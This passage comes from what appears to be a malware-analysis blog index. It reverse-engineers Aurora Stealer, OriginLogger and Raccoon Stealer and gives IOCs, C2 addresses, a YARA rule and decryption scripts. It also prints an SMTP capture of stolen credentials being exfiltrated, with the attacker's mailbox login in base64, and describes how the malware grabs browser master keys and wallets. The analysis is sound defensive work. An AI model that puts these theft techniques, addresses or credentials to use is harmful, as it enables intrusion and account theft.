","date":"2023-04-23","objectID":"/aurora-stealer-builder/:8:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"IOCs: ebd1368979b5adb9586ce512b63876985a497e1727ffbd54732cd42eef992b81 aurora.exe (2023 version) e7aa0529d4412a8cee5c20c4b7c817337fabb1598b44efbf639f4a7dac4292ad builder archive (2023 version) 33fc61e81efa609df51277aef261623bb291e2dd5359362d50070f7a441df0ad aurora.exe (2022 version) 33b61eb5f84cb65f1744bd08d09ac2535fe5f9b087eef37826612b5016e21990 geo.Aurora 1def6bdec3073990955e917f1da2339f1c18095d31cc12452b40da0bd8afd431 ds.html f1ba92ae32fcaeea8148298f4869aef9bcd4e85781586b69c83a830b213d3d3c statistic.html 8b1abbb51594b6f1d4e4681204ed97371bd3d60f093e38b80b8035058116ef1d bot.html e9cf3e7d2826fa488e7803d0d19240a23f93a7f007d66377beb1849c5d51c0af commands.html d7829f17583b91fb1e8326e1c80c07fc29e0608f1ba836738d2c86df336ea771 rergister.html 1b88624936d149ecdea6af9147ff8b2d8423125db511bdf1296401033c08b532 settings.html 185.106.93.237:56763 Aurora server -version 2023- used in user account verification 185.106.93.237:6969 Aurora server -version 2022- used in user account verification Auth.aurora locally created for each Aurora panel user and used in account verification scr_n_f.png contains config information screenshot/ a local folder that contains victims’ screenshots \u003c*\u003e_ACTUAL.png screenshot of current state of online bots \u003c\u003e_\u003c\u003e.png custom screenshots format The following go files were identified in the binary, all starting with the path: “C:/Users/SixSixSix/Desktop/Botnet 2023/26.01.2023/new/” auth.go crypt.go command.go compressor.go core.go geo.go main.go pfor.go port.go web.go core/statistics/window.go core/statistics/winfuns.go core/statistics/queue.go core/monitor/monitor.go core/common/copy.go core/common/udpconn.go core/common/util.go core/logger/logger.go core/schema/monitor.go core/schema/util.go core/server/client.go core/server/client_handlers.go core/server/server.go core/server/server_handlers.go There are similar files identified in the old version of the builder/panel. The common path for this older sample is: “C:/Users/SixSixSix/Desktop/Aurora 2022/server” auth.go compressor.go config.go cryptography.go favicon.go geo.go gui.go main.go notify.go other.go server.go telegram.go zip.go ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:9:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"Yara Seeds To create the Yara rules, the following strings were used. Those are all present in the builder: 127.0.0.1:7273 POWR WORK PORT_FORWARD FTP_RUN - REVESRE START _*Aurora_2023_Technology_* AURORA_TECHNOLOGY ./cache/Auth.aurora _ACTUAL ./bots/screenshot/ ./core/scr_n_f.png EXTERNAL_RUN_PE_X64 [Aurora] Botnet - SERVER - RUN - old sample. ./cache/Config.Aurora ./cache/Aurora.Aurora ./cache/telegram.Aurora ./cache/ATX.Aurora Aurora_Stealer_2033 Aurora_Stealer_SERVER Aurora_Stealer_2022 https://api.telegram.org/bot%s/%s ./cache/AuthHash.Aurora [Aurora Stealer]: Yes i am work! ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:10:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"Acknowledgments: @gi7w0rm for providing me with the samples and helping me formatting the article to make it better. ","date":"2023-04-23","objectID":"/aurora-stealer-builder/:11:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer Builder","uri":"/aurora-stealer-builder/"},{"categories":["Malware Analysis"],"content":"Aurora Stealer","date":"2023-04-12","objectID":"/aurora-stealer/","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Introduction Aurora Stealer is an information stealer Written in GO. It is a commercial stealer that costs around 250$ per month. The malware can steal Browser password and saved cookies, crypto information (Desktop and Web), Telegram, Steam and Specific files from the victim machine and can take a screenshot from it. ","date":"2023-04-12","objectID":"/aurora-stealer/:1:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Basic information The icon of the executable gives us a hit about how this is spreading. It has Photoshop icon, most probably it was spreading using Malvertising. ","date":"2023-04-12","objectID":"/aurora-stealer/:2:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Binary Identification First we want to know some basic information about the file so I will use DiE to do so. It was identified as GO binary. .symtab is a legacy section in GO binaries. In GO binaries prior to Version 1.3 .symtab section hold the symbol table but it is no longer filed with anything useful. Without Symbols, the reversing will be so hard as a simple Hello world program in GO has about 2000 function this is a result of that GO compiler statically linking all the needed libraries. Later, I will try to tackle this problem using existed Tools. An important aspect of the basic Triaging of a Malware is to check the readable Strings of the file. But GO is different in everything. The strings has a part of that too. In GO, the strings are stored in Unicode format without null terminating character so many tools will handle that wrong. Also, the existence of this large number of library functions will make it worse. The resulting number of lines using strings utility in Die is 7371 line. We can reduce this number by matching for the library functions like the following Regex .*(runtime|\\/usr|\\/root).*\\n? this matches the lines that contains runtime, usr and root. this filters around 2500 line but still around 5000 line. these lines contains the function imported in program, you can check them but it will be so exhausting to get information from it. Let’s Continue our analysis using the disassembler. ","date":"2023-04-12","objectID":"/aurora-stealer/:2:1","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Code Analysis I will upload the sample to IDA to explore it. In the old versions of IDA, Library functions will not be recognized and renamed. Also the types will be mostly wrong. To handle this there is some tools you can use to fix the types and names. I’ve used GoReSym. This is a standalone executable you can run with following parameters GoReSym_win.exe -t -d -p \u003cPATH_TO_FILE\u003e \u003e fix.json for more info about the available parameters, Check the repo of the tool. content of the output is in JSON format so I saved it to use it in this IDA Script to rename the functions and correct the types in IDA database. NOTE: -t parameter fix the types information but if you the decompiler will fail to decompile it. If you want to know how this tool is working, Check this article. Basically it search for pclntab structure by searching for a magic header and follow the pointer to symbols table. // pcHeader holds data used by the pclntab lookups. type pcHeader struct { magic uint32 /* go12magic = 0xfffffffb go116magic = 0xfffffffa go118magic = 0xfffffff0 go120magic = 0xfffffff1 */ pad1, pad2 uint8 // 0,0 minLC uint8 // min instruction size ptrSize uint8 // size of a ptr in bytes nfunc int // number of functions in the module nfiles uint // number of entries in the file tab textStart uintptr // base for function entry PC offsets in this module, equal to moduledata.text funcnameOffset uintptr // offset to the funcnametab variable from pcHeader cuOffset uintptr // offset to the cutab variable from pcHeader filetabOffset uintptr // offset to the filetab variable from pcHeader pctabOffset uintptr // offset to the pctab variable from pcHeader pclnOffset uintptr // offset to the pclntab variable from pcHeader } This is also used by the go parser itself in order to locate the function, For more info here Another set of scripts available we can use it doing the same thing is Alphagolang I will use Alphagolang here but both will provide similar result. First I used recreate_pclntab.py script to recreate pclntab structure. Second, I used function_discovery_and_renaming.py script to rename the functions. Third, I used categorize_go_folders.py to categorize the functions and pack them in folders, This will be very helpful to focus on user-code. Fourth, I used string_cast.py to fix string references. Fifth, I used extract_types.py to correct the types information by applying C like types to the used structures. The result Now, We have a better environment so we can start exploring the code efficiently. ","date":"2023-04-12","objectID":"/aurora-stealer/:2:2","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Calling Conventions in GO In function calls, GO has a different calling convention. All the argument are passed using the stack from the left to right. The following assembly code is in Go assembler format func testConv(x,y int) int {return x+y} testConv: MOVQ 0x8(SP), AX ; get arg x MOVQ 0x10(SP), CX ; get arg y ADDQ CX, AX ; %ax \u003c- x + y MOVQ AX, 0x20(SP) ; return x+y-z RET the compiler have to make sure that there is enough space on the stack to accommodate all the arguments and return values. ","date":"2023-04-12","objectID":"/aurora-stealer/:2:3","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Strings in GO Go stores strings in a Unicode -UTF-8- format without null terminating characters in a section contain all the strings but. Strings in go stored in structure of value and length pair called StringHeader. So, in all the function where a string argument is passed, you will see an extra argument contain the length of the string. type StringHeader struct { Data uintptr Len int } First we start with main_init function (sub_595590). In GO, init() is a predefined function that takes no argument, Return no values. And Runs before any code in the package. The block number 1 shows that it loads some DLLs and functions. DLL Function user32.dll GetDesktopWindow user32.dll EnumDisplayMonitors user32.dll GetMonitorInfoW user32.dll EnumDisplaySettingsW kernel32.dll LocalFree Crypt32.dll CryptUnprotectData In Block number 2, It Reads the the environment Variable USERPROFILE and concatenate \\\\APPDATA\\\\LOCAL\\ and \\\\APPDATA\\\\ROAMING\\ and save the new string to the memory. In block 3, It did the same thing to get the Paths C:\\\\Users\\\\{user}\\\\APPDATA\\\\ROAMING,\u003cLocal\u003e\\\\ but it replaces the string C:\\\\Users with C:\\\\windows.old\\Users with Replace function from strings package func Replace(original string, old string, new string, n int) string //where n is the number of times replacing occures. -1 for replace all this location is created when the user update from one version to another and it contains all the old information from the previous installation. moving to main_main (sub_595470). It creates a new procedure by making a call to newproc function from runtime package. ","date":"2023-04-12","objectID":"/aurora-stealer/:2:4","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Connect To server following the code to main_ConnectToServer (sub_58ABE0). This function has some interesting functionality we will explore next. In block 1, the malware sleeps for 1000000000 nanoseconds -I tried a simple program with the same call to sleep and it was equivalent to time.Nanosecond - Then it establishes a TCP connection to 82.115.223.249:8081 IP address using function Dial from net package. Then it Reads the Received packet. the Dial function in GO returns 2 values, Conn interface and Error, which IDA cannot recognize so, I will follow my intuition. If the connection returned error, it will try to reconnect again. In Block 2, The connection was established but it first checks the response from the remote IP. If it was blocked due to the geo location, as the IP is Russian, it will try to reconnect. If the response was WORK string, the connection is established successfully and the malware can continue with its functionality as shown in block 3 and 4 ","date":"2023-04-12","objectID":"/aurora-stealer/:2:5","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Collect victim information Moving to main_GetInfoUser() (sub_58B880). The first Lines in this subroutine takes us to another function, main_MachineID (sub_5897A0) The malware Runs the command cmd.exe /c wmic csproduct get uuid to get UUID of the device. Returning to main_GetInfoUser . It retrieves the screen width and height using win32 API GetSystemMetrics , GO allow using third-party packages directly from GitHub and the the cause of the function naming. The screen resolution is represented in the format \u003cwidth\u003ex\u003cheight\u003e . The next call is to main_GetOS (sub_58A530). This function retrieves the OS version using wmic command wmic os get Caption . and filter the output based on the form it is printed to format is in a space separated string. Returning back to main_GetInfoUser a call to main_getGPU (sub_58A200) is made. The GPU information retrieved by executing the command cmd /C wmic path win32_VideoController get name Using the same method in main_getCPU (sub_589F10). It gets CPU information with command cmd /c wmic cpu get name in main_sysTotalMemory (sub_58B550)It gets the memory status by executing GlobalMemoryStatusEx function. main_CMD_SHELL is called to execute cmd /c systeminfo that gets all the specs of the device. That was the last thing the function main_GetInfoUser do. Back in main_main , the function main_grab (sub_593E80) is called. This function responsible for doing the main goal of the malware, Stealing. panic function is used to check for unexpected errors. common use of panic is to abort if a function returns an error value that we don’t want to handle. ","date":"2023-04-12","objectID":"/aurora-stealer/:2:6","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"File grabber Going to the first function main_file_grabber (sub_594110) this function search for a specific file taken from the C2 server and it is base64 encoded and in JSON format. Then, It search for the file in some predefined directories and location. the function io_ioutil_ReadDir reads the content of the directory and stores the output in a fs.fileinfo structure , sorted by the filename type FileInfo interface { Name() string // base name of the file Size() int64 // length in bytes for regular files; system-dependent for others Mode() FileMode // file mode bits ModTime() time.Time // modification time IsDir() bool // abbreviation for Mode().IsDir() Sys() any // underlying data source (can return nil) } Then it walks through the returned structure and reads the file of interest then it encode the file content in Base64 and adds the tags used in the JSON formatted packet content to be sent to the remote system ","date":"2023-04-12","objectID":"/aurora-stealer/:2:7","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Browser data We will visit SendToServer latter. Now, lets go back to the caller function and explore the next function, main_Grab_func3 (sub_58F0B0). This function goes through the %APPDATA%Roaming directory and calls another function. the function path_filepath_Walk walks the directory from the Root passed in the second parameter calling a function fn.WinDirFunc at each file and directory in it including the Root. func Walk(root string, fn WalkFunc) error type WalkFunc func(path string, info fs.FileInfo, err error) error So, Next one to visit is WalkFunc used main_Grab_func3_2 (sub_58DED0). This function steals the Browser information stored For Chromium based browsers it gets the Local State file and calls main_getMasterKey that as the name suggest, Gets the master key and decode it .then, decrypts it by calling CryptUnprotectData which is called from main_xDecrypt It handles the case of using Opera and Firefox browsers Back to the caller function, The malware steals the password and cookies from the browser data and adds the tags of the JSON file to be sent to the C2 server. ","date":"2023-04-12","objectID":"/aurora-stealer/:2:8","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Crypto Then, It goes through the %USERPROFILE% searching for any Crypto wallets information It Looks for PC applications and Web based wallets and add its associated type and name to the JSON data to be sent ","date":"2023-04-12","objectID":"/aurora-stealer/:2:9","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Screenshot Capture function main_Grab_func_7 (sub_591D50) is used to take a screenshot from the victim system The PNG file is then base64 encoded and add the value to the tag screenshot to be sent. ","date":"2023-04-12","objectID":"/aurora-stealer/:2:10","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Telegram Data The next targeted information is Telegram, It did the same procedure discussed before with telegram data folder at main_Grab_func_6 (sub_591980) WalkFunc → main_Grab_func_6_2 (sub_591120) ","date":"2023-04-12","objectID":"/aurora-stealer/:2:11","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Steam data function main_Grab_func9 (sub_593B30) steals steam data in the same way ","date":"2023-04-12","objectID":"/aurora-stealer/:2:12","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"send To server main_SendToServer_NEW (sub_594DD0) is used to send the collected data to the server. The collected information stored in JSON format. the Data then compressed using gzip compression algorithm and encoded with Base64 encoding to be sent to the server using the previously established TCP connection. ","date":"2023-04-12","objectID":"/aurora-stealer/:2:13","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Network Analysis we can look at the network communication using PCAP file provided by Any Run sandbox. By opening the file in Wireshark and filter using the IP 82.115.223.249 Following the TCP stream The first packet received is WORK indicates that the connection is successful and the malware then begin to collect the required data and compress it and send it to the server. At the last packet received from the the C2 server is Thanks. we can use Cyberchef to decode and decompress the data. the Error list include the files that the malware cannot read or access. On of the packets has a very large size, as the screenshot field has a very large Base64 encoded data the screenshot: Sample JSON file can be found here https://pastebin.com/YpTwAC94 ","date":"2023-04-12","objectID":"/aurora-stealer/:3:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Conclusion Aurora stealer is a new commercial infostealer. Most of it’s capabilities are typical things that can be found in most of the stealers. it can grab Browser saved password/cookies and Cryptocurrency wallets information from Desktop applications and Web based wallets. Also, it can grab a files from the victim machine and take a screenshot. The communication with C2 server is done over TCP protocol. Most of these things can be found in most of the stealer But being written in GO makes it special, even it has a plaintext strings, The reversing process is quite annoying as most of the tools cannot handle GO binaries in a right way. ","date":"2023-04-12","objectID":"/aurora-stealer/:4:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"IOCs: 29339458f4a33ee922f25d36b83f19797a15a279634e9c44ebd3816866a541cb 82.115.223[.]249:8081 ","date":"2023-04-12","objectID":"/aurora-stealer/:5:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"Yara Rule rule aurora_stealer{ meta: malware = \"Aurora stealer\" hash = \"29339458f4a33ee922f25d36b83f19797a15a279634e9c44ebd3816866a541cb\" reference = \"https://d01a.github.io/\" Author = \"d01a\" description = \"detect Aurora stealer\" strings: $is_go = \"Go build\" ascii $a1 = \"C:\\\\Windows.old\\\\Users\\\\\" ascii $a2 = \"\\\\AppData\\\\Roaming\\\\\" ascii $a3 = \"wmic csproduct get uuid\" ascii $a4 = \"wmic cpu get name\" ascii $a5 = \"systeminfo\" ascii $a6 = \"coNNNECTIONGWQFGQW\" ascii $fun1 = \"main.Grab\" ascii $fun2 = \"main.getMasterKey\" ascii $fun3 = \"main.SendToServer_NEW\" ascii $fun4 = \"main.ConnectToServer\" ascii $fun5 = \"main.xDecrypt\" ascii $fun6 = \"main.GetDisplayBounds\" ascii condition: uint16(0) == 0x5a4d and ( $is_go and (4 of ($a*)) and (4 of ($fun*)) ) } ","date":"2023-04-12","objectID":"/aurora-stealer/:6:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"References https://gist.github.com/alexander-hanel/59af86b0154df44a2c9cebfba4996073 The Go Programming Language https://pkg.go.dev/ PCAP file https://dr-knz.net/go-calling-convention-x86-64.html https://dr-knz.net/go-calling-convention-x86-64-2020.html Aurora: a rising stealer flying under the radar - SEKOIA.IO Blog ","date":"2023-04-12","objectID":"/aurora-stealer/:7:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Aurora Stealer","uri":"/aurora-stealer/"},{"categories":["Malware Analysis"],"content":"OriginLogger: A look at OriginLogger Loader, extracting the final payload and network traffic analysis","date":"2023-01-16","objectID":"/originlogger/","tags":["Malware Analysis","Reverse Engineering"],"title":"OriginLogger Loader","uri":"/originlogger/"},{"categories":["Malware Analysis"],"content":"Conclusion Origin Logger is a variant of Agent tesla, it is build on top of it and uses all of its capabilities. The malware is spreading using spam emails with a malicious attachments. The malware exfiltrate user accounts and passwords and other information from the infected machine. ","date":"2023-01-16","objectID":"/originlogger/:1:0","tags":["Malware Analysis","Reverse Engineering"],"title":"OriginLogger Loader","uri":"/originlogger/"},{"categories":["Malware Analysis"],"content":"Infection through Email the infection is started with spam email attached by .iso File the .ISO file contains only an executable with a PDF icon. ","date":"2023-01-16","objectID":"/originlogger/:2:0","tags":["Malware Analysis","Reverse Engineering"],"title":"OriginLogger Loader","uri":"/originlogger/"},{"categories":["Malware Analysis"],"content":"Loader Analysis the ISO file contains .exe file that is likely to be the fist loader. Dropping the executable in Detect It Easy It is a .NET executable and the entropy is not high, Hopefully it will not be packed . So, I will use dnSpyEx to decompile the executable. Going to the Entry Point: there is Three function calls. EnableVisualStyles and SetCompatibleTextRenderingDefault both do not contain anything useful as they are library functions and not written by the author. the third part is creating a instance to Form1 class. The constructor contains two functions: InitializeComponent is used to configure the form, it is not part of the malicious code so let’s continue to Socker function. by exploring the first function, it stores a random string in Text variable and calls Hyper.Array(). Hyper class contains the information we are looking for, a link for the second stage. starting with Array() function which calls GetBuffer() . GetBuffer() just calls Avrql() and passing http://savory.com[.]bd/sav/Ztvfo.png as an argument. Avrql() function downloads the file Ztvfo.png and stores it as an array in the memory and returns that Array. Returning to Array() function which takes the downloaded file in buffer variable and XOR it with the string Sfhdjkpkowgnpcgoshb and stores the XORed data in list array. that’s all for the hyper class, returning back to Socker to check the other function. Void() loads assembly data stored in Tag which is the file downloaded and XORed previously. To run the loaded assembly, Lion() and Ursa are used, both Invokes different namespaces from the randomized string this.richTextBox1.Text = \"Gdbtshcw.Sdnceyzqa Vqyhbeqthicxedwtrnxrbzcq\" ","date":"2023-01-16","objectID":"/originlogger/:3:0","tags":["Malware Analysis","Reverse Engineering"],"title":"OriginLogger Loader","uri":"/originlogger/"},{"categories":["Malware Analysis"],"content":"Downloading the second stage using the PCAP file provided with the sample to get the second stage. we can use wireshark to do so. to Download the file, navigate to File \u003e Export Objects \u003e HTTP The Content of the this file is Encrypted using XOR cipher as we saw previously. using the following script to decrypt the file import struct s=[] key = b\"Sfhdjkpkowgnpcgoshb\" with open(\"Ztvfo.bin\",'rb') as f: buff = bytearray(f.read()) for i in range(len(buff)): s.append((buff[i] ^ ord(key[i%len(key)]))) with open(\"Ztvfo_out.bin\",'wb') as f: f.write(struct.pack('664576B', *s)) ","date":"2023-01-16","objectID":"/originlogger/:4:0","tags":["Malware Analysis","Reverse Engineering"],"title":"OriginLogger Loader","uri":"/originlogger/"},{"categories":["Malware Analysis"],"content":"second stage Analysis Uploading the extracted file to DIE, The executable is obfuscated using .NET Reactor. ","date":"2023-01-16","objectID":"/originlogger/:5:0","tags":["Malware Analysis","Reverse Engineering"],"title":"OriginLogger Loader","uri":"/originlogger/"},{"categories":["Malware Analysis"],"content":"Network capture analysis from the provided PCAP file of the traffic. Origin Logger exfiltrate the data using SMTP communication. the following is the content of the communication: 220-bh-41.webhostbox.net ESMTP Exim 4.95 #2 Thu, 05 Jan 2023 22:51:30 +0000 220-We do not authorize the use of this system to transport unsolicited, 220 and/or bulk e-mail. EHLO DESKTOP-WIN11PC 250-bh-41.webhostbox.net Hello DESKTOP-WIN11PC [173.66.46.112] 250-SIZE 52428800 250-8BITMIME 250-PIPELINING 250-PIPE_CONNECT 250-AUTH PLAIN LOGIN 250-STARTTLS 250 HELP AUTH login bWFya2V0aW5nQHRyYW5zZ2Vhci5pbg== 334 UGFzc3dvcmQ6 TUBzc3cwcmQjNjIx 235 Authentication succeeded MAIL FROM:\u003cmarketing@transgear.in\u003e 250 OK RCPT TO:\u003czaritkt@arhitektondizajn.com\u003e 250 Accepted DATA 354 Enter message, ending with \".\" on a line by itself MIME-Version: 1.0 From: marketing@transgear.in To: zaritkt@arhitektondizajn.com Date: 5 Jan 2023 22:51:31 +0000 Subject: PW_windows11user/DESKTOP-WIN11PC Content-Type: text/html; charset=us-ascii Content-Transfer-Encoding: quoted-printable Time: 01/05/2023 22:51:26\u003cbr\u003eUser Name: windows11user\u003cbr\u003eComputer= Name: DESKTOP-WIN11PC\u003cbr\u003eOSFullName: Microsoft Windows 11 Pro\u003cbr= \u003eCPU: Intel(R) Core(TM) i5-13600K CPU @ 5.10GHz\u003cbr\u003eRAM: 32165.83 = MB\u003cbr\u003eIP Address: 173.66.46.112\u003cbr\u003e\u003chr\u003eURL:imap://mail.windows11u= sers.com\u003cbr\u003e=0D=0AUsername:admin@windows11users.com\u003cbr\u003e=0D=0APass= word:EBj%U7-p@q4NW\u003cbr\u003e=0D=0AApplication:Thunderbird\u003cbr\u003e=0D=0A\u003chr\u003e= =0D=0AURL:smtp://mail.windows11users.com\u003cbr\u003e=0D=0AUsername:admin@= windows11users.com\u003cbr\u003e=0D=0APassword:EBj%U7-p@q4NW\u003cbr\u003e=0D=0AApplicat= ion:Thunderbird\u003cbr\u003e=0D=0A\u003chr\u003e=0D=0AURL:webmail.windows11users.com= \u003cbr\u003e=0D=0AUsername:admin@windows11users.com\u003cbr\u003e=0D=0APassword:EBj= %U7-p@q4NW\u003cbr\u003e=0D=0AApplication:Edge Chromium\u003cbr\u003e=0D=0A\u003chr\u003e=0D=0AURL= :https://login.us.coca-cola.com/\u003cbr\u003e=0D=0AUsername:admin@windows1= 1users.com\u003cbr\u003e=0D=0APassword:Zp61-7$r#J_iLpCYV\u0026jKr\u003cbr\u003e=0D=0AAppli= cation:Edge Chromium\u003cbr\u003e=0D=0A\u003chr\u003e=0D=0AURL:https://www.linkedin.= com/\u003cbr\u003e=0D=0AUsername:admin@windows11users.com\u003cbr\u003e=0D=0APassword= :TqQPvG#0g%$ga_q51\u003cbr\u003e=0D=0AApplication:Edge Chromium\u003cbr\u003e=0D=0A\u003ch= r\u003e=0D=0AURL:https://www.amazon.com/ap/signin\u003cbr\u003e=0D=0AUsername:ad= min@windows11users.com\u003cbr\u003e=0D=0APassword:3Fo76#PTf4P$Im!9mkLso69e= T\u003cbr\u003e=0D=0AApplication:Edge Chromium\u003cbr\u003e=0D=0A\u003chr\u003e=0D=0AURL:https= ://www.target.com/login\u003cbr\u003e=0D=0AUsername:windows11user\u003cbr\u003e=0D=0APas= sword:c$Kl3wO!e#i7A\u0026!L2\u003cbr\u003e=0D=0AApplication:Edge Chromium\u003cbr\u003e=0D=0A= \u003chr\u003e=0D=0AURL:https://myaccount.nytimes.com/auth/login\u003cbr\u003e=0D=0AU= sername:admin@windows11users.com\u003cbr\u003e=0D=0APassword:u*N21Or650yBps= p45awSa\u003cbr\u003e=0D=0AApplication:Edge Chromium\u003cbr\u003e=0D=0A\u003chr\u003e=0D=0A . 250 OK id=1pDZ59-000wFk-B4 QUIT 221 bh-41.webhostbox.net closing connection the exfiltrated data type of data example from the PCAP Current Time 01/05/2023 22:51:26 OS Full Name Microsoft Windows 11 Pro CPU Intel(R) Core(TM) i5-13600K CPU @ 5.10GHz RAM 32165.83 MB IP Address 173.66.46.112 URL imap[://]mail.windows11users[.]com Username admin@windows11users[.]com Password EBj%U7-p@q4NW Application: Edge Chromium AURL=https[://]login.us.coca-cola[.]com/ Username:admin@windows11users[.]com Password:Zp61-7$r#J_iLpCYV\u0026jKr it steals the username and password of the user and send data of the current machine and steals user accounts from different locations like thunderbird and edge browser. ","date":"2023-01-16","objectID":"/originlogger/:6:0","tags":["Malware Analysis","Reverse Engineering"],"title":"OriginLogger Loader","uri":"/originlogger/"},{"categories":["Malware Analysis"],"content":"References https://www.malware-traffic-analysis.net/2023/01/05/index.html ","date":"2023-01-16","objectID":"/originlogger/:7:0","tags":["Malware Analysis","Reverse Engineering"],"title":"OriginLogger Loader","uri":"/originlogger/"},{"categories":["Malware Analysis"],"content":"File hashes 926a3142270a52f8afb93490d5dd21f0ca23bc0815ee6630068cf6409d8ee448 5016ba92afac1c2b2a2a6b17a09406869bd6f58cfe680f25030af1a1ba1c29a2 90d977ca0a3331d78005912d2b191d26e33fa2c6ef17602d6173164ba83fd85e 3883d374ba0736254a89e310b86f3c3769adcaed471b103b5c0a8a2f16cf5c8d ","date":"2023-01-16","objectID":"/originlogger/:8:0","tags":["Malware Analysis","Reverse Engineering"],"title":"OriginLogger Loader","uri":"/originlogger/"},{"categories":["Malware Analysis"],"content":"Raccoon Stealer","date":"2022-09-12","objectID":"/raccoon-stealer/","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"Conclusion Raccoon Stealer V2 (or RecordBreaker) Is a stealer that provided as a service with about 200$/m. It is a new version of Raccoon stealer that appeared in 2019 and died for a while then it returns with this new Stealer which known as RecordBreaker. It Comes with a lot of capabilities, It can grab a lot of sensitive information like : Steal Victim System information Steal Victim Username and passwords stored in the browser Steal Victim Browser’s Autofill Information Steal Credit Card information Steal Crypto wallets Information Steal Bitcoin Wallets Grab any file from the victim system Take Screenshots from the victim system Load next stage ","date":"2022-09-12","objectID":"/raccoon-stealer/:1:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"Analysis ","date":"2022-09-12","objectID":"/raccoon-stealer/:2:0","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"First Look First we start with basic analysis, using Detect it easy we see that the file seems to be not packed. Exploring the strings tab, we see a lot of base64 encoded strings and two registry keys SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall and SOFTWARE\\Microsoft\\Cryptography Strings\rtrying to encode the base64 strings will produce encrypted data so i think thats all with basic insights about the executable and lets upload the sample to IDA (and ghidra for decompiling) ","date":"2022-09-12","objectID":"/raccoon-stealer/:2:1","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"Dynamically resolving DLLs and APIs In the entry function we see two function calls at the very beginning to sub_401000 and sub_404036. by navigating to sub_401000 we see that this function resolve the required APIs dll loaded\r","date":"2022-09-12","objectID":"/raccoon-stealer/:2:2","tags":["Malware Analysis","Reverse Engineering"],"title":"Raccoon Stealer","uri":"/raccoon-stealer/"},{"categories":["Malware Analysis"],"content":"Decrypting the encrypted data After going back to to the entry function, After resolving the APIs there is another function call sub_404036 . This function takes a pattern that seems to be decrypting the data. The sequence is a call to sub_00401806 that calls CryptStringToBinaryA after calling LstrLenA. The call to CryptStringToBinaryA takes a the dwFlags parameter 0x00000001 (CRYPT_STRING_BASE64) which decode the string using base64 encoding routine and returns a byte array contains the base64-decoded encrypted data. decrypt\rafter decrypting the string there are calls to sub_0040A59A function that convert the resulting strings to unicode strings by calling MultiByteToWideChar to get all the decrypted strings we can use the debugger or by making a script to decrypt them for us import base64 from Crypto.Cipher import ARC4 strings = [ 'fVQMox8c','bE8Yjg==','bkoJoy0=','LEtihSAW6eunMDV+Aes3rVhAClFoaQM=',...,'59c9737264c0b3209d9193b8ded6c127','XVHmGYV5cH1pvOC0w/cmantl/oG9aw=='] key = \"edinayarossiya\".encode('utf-8') for i in strings: cipher = ARC4.new(key) print(cipher.decrypt(base64.b64decode(i.encode('utf-8')))) the decrypted strings: tlgrm_ ews_ grbr_ %s\\tTRUE\\t%s\\t%s\\t%s\\t%s\\t%s\\n 